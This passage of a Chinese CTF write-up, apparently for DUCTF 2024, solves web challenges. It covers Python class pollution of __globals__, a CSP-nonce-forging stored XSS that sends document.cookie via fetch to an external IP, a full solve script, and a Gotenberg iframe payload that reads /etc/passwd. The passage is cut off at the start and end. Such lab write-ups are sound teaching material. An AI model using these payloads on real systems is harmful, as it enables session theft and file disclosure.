<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
<span class="token property">"__class__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__init__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__globals__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"flag"</span><span class="token operator">:</span><span class="token string">"true"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>发送然后访问<code>get_flag</code>路由<br><img src="https://ooo.0x0.ooo/2024/07/08/OP0zeL.png" alt="OP0zeL.png" loading="lazy"></p>
<h2 id="co2v2"><a href="#co2v2" class="headerlink" title="co2v2"></a>co2v2</h2><pre class="language-none"><code class="language-none">Well the last time they made a big mistake with the flag endpoint, now we don&#39;t even have it anymore. It&#39;s time for a second pentest for some new functionality they have been working on.</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/08/OP0hIX.png" alt="OP0hIX.png" loading="lazy"><br>多出来个report<br>在v2版本中，<code>get_flag</code>路由被删掉了<br>看一下新添的内容</p>
<pre class="language-python" data-language="python"><code class="language-python">CORS<span class="token punctuation">(</span>app<span class="token punctuation">)</span>
SECRET_NONCE <span class="token operator">=</span> generate_random_string<span class="token punctuation">(</span><span class="token punctuation">)</span>
RANDOM_COUNT <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span>
limiter <span class="token operator">=</span> Limiter<span class="token punctuation">(</span>
    app<span class="token operator">=</span>app<span class="token punctuation">,</span>
    key_func<span class="token operator">=</span>get_remote_address<span class="token punctuation">,</span>
    default_limits<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"60 per minute"</span><span class="token punctuation">]</span>
<span class="token punctuation">)</span>
TEMPLATES_ESCAPE_ALL <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token comment">#转义所有输出</span>
TEMPLATES_ESCAPE_NONE <span class="token operator">=</span> <span class="token boolean">False</span>
<span class="token keyword">def</span> <span class="token function">generate_nonce</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    nonce <span class="token operator">=</span> SECRET_NONCE <span class="token operator">+</span> data <span class="token operator">+</span> generate_random_string<span class="token punctuation">(</span>length<span class="token operator">=</span>RANDOM_COUNT<span class="token punctuation">)</span>
    sha256_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sha256_hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>nonce<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    hash_hex <span class="token operator">=</span> sha256_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    g<span class="token punctuation">.</span>nonce <span class="token operator">=</span> hash_hex
    <span class="token keyword">return</span> hash_hex
<span class="token keyword">def</span> <span class="token function">set_nonce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    generate_nonce<span class="token punctuation">(</span>request<span class="token punctuation">.</span>path<span class="token punctuation">)</span></code></pre>
<p>生成一个随机字符串赋值给<code>SECRET_NONCE</code>，在生成一个随机整数<code>RANDOM_COUNT</code>,两个变量用来生成一个nonce,<code>SECRET_NONCE</code>+请求路径+<code>RANDOM_COUNT</code>长度的字符串然后经过哈希和转16进制得到nonce</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">apply_csp</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>
    nonce <span class="token operator">=</span> g<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'nonce'</span><span class="token punctuation">)</span> <span class="token comment">#从全局对象获取nonce字段的值</span>
    csp_policy <span class="token operator">=</span> <span class="token punctuation">(</span>
        <span class="token string-interpolation"><span class="token string">f"default-src 'self'; "</span></span> <span class="token comment">#默认内容来源于自身</span>
        <span class="token string-interpolation"><span class="token string">f"script-src 'self' 'nonce-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nonce<span class="token punctuation">&#125;</span></span><span class="token string">' https://ajax.googleapis.com; "</span></span> <span class="token comment">#脚本来源于自身</span>
        <span class="token string-interpolation"><span class="token string">f"style-src 'self' 'nonce-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nonce<span class="token punctuation">&#125;</span></span><span class="token string">' https://cdn.jsdelivr.net; "</span></span>   <span class="token comment">#style来源于自身</span>
        <span class="token string-interpolation"><span class="token string">f"script-src-attr 'self' 'nonce-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nonce<span class="token punctuation">&#125;</span></span><span class="token string">'; "</span></span>  <span class="token comment">#脚本属性来源于自身</span>
        <span class="token string-interpolation"><span class="token string">f"connect-src *; "</span></span>  <span class="token comment">#允许所有连接</span>
    <span class="token punctuation">)</span>
    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">]</span> <span class="token operator">=</span> csp_policy <span class="token comment">#将生成的CSP策略添加到响应头里面</span>
    <span class="token keyword">return</span> response</code></pre>
<p>该函数向http响应中添加了内容安全策略(Content Security Policy)头</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">login_required</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token decorator annotation punctuation">@wraps</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">decorated_function</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">'Not allowed.'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
    <span class="token keyword">return</span> decorated_function</code></pre>
<p>装饰器函数没看出来有什么用</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">admin_required</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token decorator annotation punctuation">@wraps</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">decorated_function</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>is_authenticated <span class="token keyword">or</span> current_user<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">'Not allowed.'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
    <span class="token keyword">return</span> decorated_function</code></pre>
<p>也是没什么用</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/changelog"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">changelog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    template <span class="token operator">=</span> template_env<span class="token punctuation">.</span>env<span class="token punctuation">.</span>get_template<span class="token punctuation">(</span><span class="token string">"changelog.html"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>nonce<span class="token operator">=</span>g<span class="token punctuation">.</span>nonce<span class="token punctuation">)</span></code></pre>
<p>获取修改日志</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/admin/update-accepted-templates"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">update_template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
    <span class="token comment"># Enforce strict policy to filter all expressions</span>
    <span class="token keyword">if</span> <span class="token string">"policy"</span> <span class="token keyword">in</span> data <span class="token keyword">and</span> data<span class="token punctuation">[</span><span class="token string">"policy"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"strict"</span><span class="token punctuation">:</span>
        template_env<span class="token punctuation">.</span>env <span class="token operator">=</span> Environment<span class="token punctuation">(</span>loader<span class="token operator">=</span>PackageLoader<span class="token punctuation">(</span><span class="token string">"app"</span><span class="token punctuation">,</span> <span class="token string">"templates"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> autoescape<span class="token operator">=</span>TEMPLATES_ESCAPE_ALL<span class="token punctuation">)</span>
    <span class="token comment"># elif "policy" in data and data["policy"] == "lax":</span>
    <span class="token comment">#     template_env.env = Environment(loader=PackageLoader("app", "templates"), autoescape=TEMPLATES_ESCAPE_NONE)</span>
    <span class="token comment"># TO DO: Add more configurations for allowing LateX, XML etc. to be configured in app</span>
    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"success"</span><span class="token punctuation">:</span> <span class="token string">"true"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/v1/report"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@limiter<span class="token punctuation">.</span>limit</span><span class="token punctuation">(</span><span class="token string">"6 per minute"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">report</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"XSSBOT_URL"</span><span class="token punctuation">,</span> <span class="token string">"http://xssbot:8000"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">/visit'</span></span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'url'</span><span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"APP_URL"</span><span class="token punctuation">,</span> <span class="token string">"http://co2v2:1337"</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token string">'X-SSRF-Protection'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>status<span class="token operator">=</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span></code></pre>
<p>多出admin用户的路由,如果policy为strict会执行设置成允许模板渲染并且会转义，为什么会禁止转义，大概是想防xss<br>再看report这个接口，会构造一个url请求把当前站点post到XSSBOT那里</p>
<pre class="language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">"SESSION_COOKIE_HTTPONLY"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span></code></pre>
<p>看了一下<code>__init__.py</code>发现<code>SESSION_COOKIE_HTTPONLY</code>被设置成立false，意思是可以通过<code>document.cookie</code>窃取cookie<br>通过源码发现flag在cookie里</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>
  <span class="token punctuation">&#123;</span>
    <span class="token string">"domain"</span><span class="token punctuation">:</span> <span class="token string">"co2v2:1337"</span><span class="token punctuation">,</span>
    <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"admin-cookie"</span><span class="token punctuation">,</span>
    <span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token string">"DUCTF&#123;testflag&#125;"</span><span class="token punctuation">,</span>
    <span class="token string">"httponly"</span><span class="token punctuation">:</span> false
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">]</span></code></pre>
<p>也就是说如果能构造xss就能获取flag，能xss需要正确的<code>nonce</code>的值并且需要绕过转义,还需要一个xss触发点<br>前两个条件可以通过上一个题的类污染来实现，触发点猜测通过XSSBOT进行XSS<br>1.第一步将RANDOM_COUNT污染成0，SECRET_NONCE污染成1，TEMPLATES_ESCAPE_ALL污染成FALSE</p>
<pre class="language-none"><code class="language-none">POST &#x2F;save_feedback HTTP&#x2F;1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko&#x2F;20100101 Firefox&#x2F;127.0
Accept: *&#x2F;*
Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
Accept-Encoding: gzip, deflate, br
Referer: http:&#x2F;&#x2F;127.0.0.1:1337&#x2F;feedback
Content-Type: application&#x2F;json
Content-Length: 55
Origin: http:&#x2F;&#x2F;127.0.0.1:1337
Connection: close
Cookie: session&#x3D;.eJwlzsENwzAIAMBdePcBNsY4y0TGgNpv0ryq7t5IXeB0H9jziPMJ2_u44gH7y2GDzMquYa6DangPQ2O1jsXGotRExI45MnwMdplGnOlFFX2RiKNLmSuxpbeQsWZzYtGljT2rGlPQtJUSUWdpncmsB2PFGxoId-Q64_hvCnx_UAcwjQ.ZouxaA.uvZoLAVpP3t4GCeDzKoGzur0RiY
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u&#x3D;1

&#123;

   &quot;__class__&quot;: &#123;
        &quot;__init__&quot;:&#123;
            &quot;__globals__&quot;:&#123;
                &quot;RANDOM_COUNT&quot;: 0,
                &quot;SECRET_NONCE&quot;: &quot;t&quot;,
                &quot;TEMPLATES_ESCAPE_ALL&quot;:false
            &#125;
        &#125;
    &#125;
&#125;</code></pre>
<pre class="language-none"><code class="language-none">HTTP&#x2F;1.1 200 OK
Server: Werkzeug&#x2F;2.3.6 Python&#x2F;3.10.9
Date: Mon, 08 Jul 2024 09:33:03 GMT
Content-Type: application&#x2F;json
Content-Length: 19
Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &#39;nonce-a3a52d289db5308e253e6cea3aa1c6953e7ba613f522ea740413fa3fdb218403&#39; https:&#x2F;&#x2F;ajax.googleapis.com; style-src &#39;self&#39; &#39;nonce-a3a52d289db5308e253e6cea3aa1c6953e7ba613f522ea740413fa3fdb218403&#39; https:&#x2F;&#x2F;cdn.jsdelivr.net; script-src-attr &#39;self&#39; &#39;nonce-a3a52d289db5308e253e6cea3aa1c6953e7ba613f522ea740413fa3fdb218403&#39;; connect-src *; 
Access-Control-Allow-Origin: http:&#x2F;&#x2F;127.0.0.1:1337
Vary: Origin, Cookie
Connection: close

&#123;&quot;success&quot;:&quot;true&quot;&#125;</code></pre>
<p>2.第二步将xss写在博客中<br>先生成一下nonce</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
SECRET_NONCE<span class="token operator">=</span><span class="token string">'t'</span>

<span class="token keyword">def</span> <span class="token function">generate_nonce</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    nonce <span class="token operator">=</span> SECRET_NONCE <span class="token operator">+</span> data 
    sha256_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sha256_hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>nonce<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    hash_hex <span class="token operator">=</span> sha256_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> hash_hex
a<span class="token operator">=</span>generate_nonce<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token comment">#a2fe8952412bc49de813bb82db50d5aa497d6106b6b43c8a72cab443aa017e32</span></code></pre>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script nonce<span class="token operator">=</span><span class="token string">"a2fe8952412bc49de813bb82db50d5aa497d6106b6b43c8a72cab443aa017e32"</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"http://43.143.198.113/"</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
<pre class="language-none"><code class="language-none">POST &#x2F;create_post HTTP&#x2F;1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko&#x2F;20100101 Firefox&#x2F;127.0
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application&#x2F;x-www-form-urlencoded
Content-Length: 214
Origin: http:&#x2F;&#x2F;127.0.0.1:1337
Connection: close
Referer: http:&#x2F;&#x2F;127.0.0.1:1337&#x2F;create_post
Cookie: session&#x3D;.eJwlzsENwzAIAMBdePcBNsY4y0TGgNpv0ryq7t5IXeB0H9jziPMJ2_u44gH7y2GDzMquYa6DangPQ2O1jsXGotRExI45MnwMdplGnOlFFX2RiKNLmSuxpbeQsWZzYtGljT2rGlPQtJUSUWdpncmsB2PFGxoId-Q64_hvCnx_UAcwjQ.ZouxaA.uvZoLAVpP3t4GCeDzKoGzur0RiY
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u&#x3D;1

title&#x3D;&lt;script nonce&#x3D;&quot;a2fe8952412bc49de813bb82db50d5aa497d6106b6b43c8a72cab443aa017e32&quot;&gt;fetch(&quot;http:&#x2F;&#x2F;43.143.198.113&#x2F;&quot;+document.cookie)&lt;&#x2F;script&gt;&amp;content&#x3D;1&amp;public&#x3D;1&amp;save&#x3D;Save+Post</code></pre>

<p>3.设置templates</p>
<pre class="language-none"><code class="language-none">POST &#x2F;admin&#x2F;update-accepted-templates HTTP&#x2F;1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko&#x2F;20100101 Firefox&#x2F;127.0
Accept: *&#x2F;*
Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
Accept-Encoding: gzip, deflate, br
Referer: http:&#x2F;&#x2F;127.0.0.1:1337&#x2F;feedback
Content-Type: application&#x2F;json
Content-Length: 77
Origin: http:&#x2F;&#x2F;127.0.0.1:1337
Connection: close
Cookie: session&#x3D;.eJwlzsENwzAIAMBdePcBNsY4y0TGgNpv0ryq7t5IXeB0H9jziPMJ2_u44gH7y2GDzMquYa6DangPQ2O1jsXGotRExI45MnwMdplGnOlFFX2RiKNLmSuxpbeQsWZzYtGljT2rGlPQtJUSUWdpncmsB2PFGxoId-Q64_hvCnx_UAcwjQ.ZouxaA.uvZoLAVpP3t4GCeDzKoGzur0RiY
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u&#x3D;1

&#123; &quot;title&quot;:&quot;&quot;, &quot;content&quot;:&quot;&quot;, &quot;rating&quot;:&quot;&quot;, &quot;referred&quot;:&quot;&quot;, &quot;policy&quot; : &quot;strict&quot; &#125;</code></pre>
<p>4.report触发xss dns外带出cookie<br><img src="https://ooo.0x0.ooo/2024/07/08/OP07jj.png" alt="OP07jj.png" loading="lazy"><br>官方wp</p>
<pre class="language-python" data-language="python"><code class="language-python">
<span class="token keyword">import</span> httpx
<span class="token keyword">import</span> os

URL <span class="token operator">=</span> <span class="token string">'http://127.0.0.1:1337/'</span>
username <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
xss_payload <span class="token operator">=</span> <span class="token string">'&lt;script nonce="a2fe8952412bc49de813bb82db50d5aa497d6106b6b43c8a72cab443aa017e32">fetch("dns.server/"+document.cookie)&lt;/script>'</span>

client <span class="token operator">=</span> httpx<span class="token punctuation">.</span>Client<span class="token punctuation">(</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL<span class="token punctuation">&#125;</span></span><span class="token string">/register'</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'a'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
r <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL<span class="token punctuation">&#125;</span></span><span class="token string">/login'</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'a'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
r <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL<span class="token punctuation">&#125;</span></span><span class="token string">/save_feedback'</span></span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'content'</span><span class="token punctuation">:</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'rating'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'referred'</span><span class="token punctuation">:</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'title'</span><span class="token punctuation">:</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">"__class__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span> <span class="token string">"__init__"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span> <span class="token string">"__globals__"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span> <span class="token string">"RANDOM_COUNT"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"SECRET_NONCE"</span><span class="token punctuation">:</span> <span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"TEMPLATES_ESCAPE_ALL"</span><span class="token punctuation">:</span> <span class="token boolean">False</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
r <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL<span class="token punctuation">&#125;</span></span><span class="token string">/admin/update-accepted-templates'</span></span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span> <span class="token string">"title"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"rating"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"referred"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"policy"</span> <span class="token punctuation">:</span> <span class="token string">"strict"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
r <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL<span class="token punctuation">&#125;</span></span><span class="token string">/create_post'</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'title'</span><span class="token punctuation">:</span>xss_payload<span class="token punctuation">,</span><span class="token string">'content'</span><span class="token punctuation">:</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'public'</span><span class="token punctuation">:</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'save'</span><span class="token punctuation">:</span><span class="token string">'Save+Post'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
r <span class="token operator">=</span> client<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL<span class="token punctuation">&#125;</span></span><span class="token string">/api/v1/report'</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
···</code></pre>
<h2 id="hah-got-em"><a href="#hah-got-em" class="headerlink" title="hah got em"></a>hah got em</h2><pre class="language-none"><code class="language-none">Oh by the way I love using my new microservice parsing these arrest reports to PDF</code></pre>
<p>附件就给了gotenberg版本8.0.3，该版本存在未授权访问，8.10版本更新了安全策略，但是对比两个版本，发现8.1.0多出一个测试用例，可以拿来攻击<br><a target="_blank" rel="noopener" href="https://github.com/gotenberg/gotenberg/compare/v8.0.3...v8.1.0#diff-be84e06649ad8faf29f22ad46330a6e9b83dbaf2d6c35b2a3656313d26a79d35R62">https://github.com/gotenberg/gotenberg/compare/v8.0.3...v8.1.0#diff-be84e06649ad8faf29f22ad46330a6e9b83dbaf2d6c35b2a3656313d26a79d35R62</a></p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>page-break-after<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>/etc/passwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/etc/passwd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>

